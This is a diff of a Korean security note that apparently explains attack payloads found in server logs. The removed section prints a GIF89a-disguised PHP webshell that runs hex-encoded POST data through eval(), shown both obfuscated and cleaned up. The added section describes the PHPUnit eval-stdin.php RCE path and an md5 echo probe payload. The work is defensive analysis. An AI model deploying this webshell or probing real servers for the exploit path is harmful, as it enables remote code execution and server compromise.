@@ -416,74 +416,38 @@ create_function(post(2), post(3))
 
 ---
 
-## 📎 예제 4. Gif89a 헤더로 이미지 업로드를 우회한 웹쉘 생성
+## 📎 예제 4. `phpunit`의 eval-stdin.php
 
-구체적으로는 `Gif89a`(GIF 헤더)로 업로드 검사 우회 후 `bbat.php` 파일을 생성하고, 그 안에서 POST로 전송한 16진수 데이터를 디코딩해 `eval()`로 실행하려는 전형적 웹쉘 패턴입니다.
+**PHPUnit RCE 취약점(CVE-2017-9841)**
 
-```
-@eval(,echo 'Gif89aMini<?php class _{
-    static public $phpcms\=null;
-    function __construct($l\=\"error\"){
-        self::$phpcms\=$l;
-        @eval(null.null.self::$phpcms);
-    }
-}
-function hexToStr($hex){
-    $str\=\"\";
-    for($i\=0;$i<strlen($hex)-1;$i \=2)
-        $str.\=chr(hexdec($hex[$i].$hex[$i 1]));
-    return $str;
-}
-$error\=null.hexToStr(@$_POST["cc"]);
-$d\=new _($error);
-?>' >bbat.php,)
-"){self::$phpcms\=$l;@eval(null.null.self::$phpcms)
+요청 경로:
 
 ```
+/laravel71/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+```
 
-보다 완전한 페이로드는 다음과 같습니다. 
+→ 공격자는 다음 URL로 접근하여 임의 PHP 코드를 실행할 수 있었습니다
+
+```
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+```
+
+이 스크립트는 **표준 입력(STDIN)을 eval() 하도록 만들어져 있어**,
+악성 코드를 그대로 실행할 수 있습니다.
+
+<br>
+
+요청 내용:
 
 ```php
-# 파일 앞부분에 GIF 헤더를 써서 업로드 검사를 우회하려는 의도
-# "Gif89a..." + "<?php ... ?>" 형태의 polyglot 파일 생성
-
-/* 생성될 PHP 코드의 핵심(의사 코드) */
-class WebShell {
-    static public $phpcms = null;
-
-    // 생성자에 전달된 문자열을 저장하고, eval로 실행하려는 구조
-    public function __construct($payload = "error") {
-        self::$phpcms = $payload;
-           @eval(self::$phpcms);
-    }
-}
-
-/* 16진수(hex) 문자열을 문자로 복원하는 함수 (POST["cc"]로 전송된 데이터) */
-function hexToStr($hex) {
-    $str = "";
-    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
-        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
-    }
-    return $str;
-}
-
-   $payload = hexToStr($_POST['cc']);
-   new WebShell($payload);   // 생성자 내부에서 eval이 호출되어 payload 실행
-
+<?php echo md5('sampariopm'); ?>
 ```
-결과 파일이 업로드 폴더에 저장되면 웹에서 접근·실행 가능
 
-* `Gif89a` : GIF 파일 헤더(업로드 필터를 속이기 위한 표식).
-* `<?php ... ?>` : PHP 코드 삽입 — 서버가 PHP로 해석하면 원격명령 가능.
-* `class _ { ... }` : 웹쉘을 담을 클래스와 정적 변수 사용(난독화 목적).
-* `hexToStr()` : POST 파라미터(`cc`)로 받은 16진수 문자열을 문자로 복원하는 함수.
-* `@eval(...)` : 복원된 코드를 실행(핵심 위험 요소).
-* `' > bbat.php'` : 결과를 `bbat.php`로 저장하려는 쉘 리다이렉션 구문(문자열에 포함되어 있음).
+→ 이건 공격자가 보통 사용하는 “서버가 내가 보낸 PHP 코드를 실제로 실행하는지 확인하는 테스트 코드(*RCE success-check payload*)”입니다.
 
-* 공격자는 GIF 헤더(또는 이미지 허용 검사)를 이용해 `.php` 확장자가 아닌 파일로 업로드하거나, 내부에 GIF 헤더를 끼워 넣어 업로드 필터 우회.
-* 실제 실행은 `hexToStr($_POST["cc"])`로 전달된 16진수 페이로드를 `eval()`로 실행하는 지점에서 발생.
-* `class _` 와 정적 변수, 난독화(문자 결합 등)는 탐지를 회피하려는 수법.
+왜 md5를 쓰냐면:
 
-
-```
+* 실행이 성공하면 응답으로 고정된 해시값이 돌아옴
+* 공격자가 응답만 보고 RCE 성공 여부를 즉시 파악 가능
+* 서버 로그에도 흔적이 거의 남지 않음
 
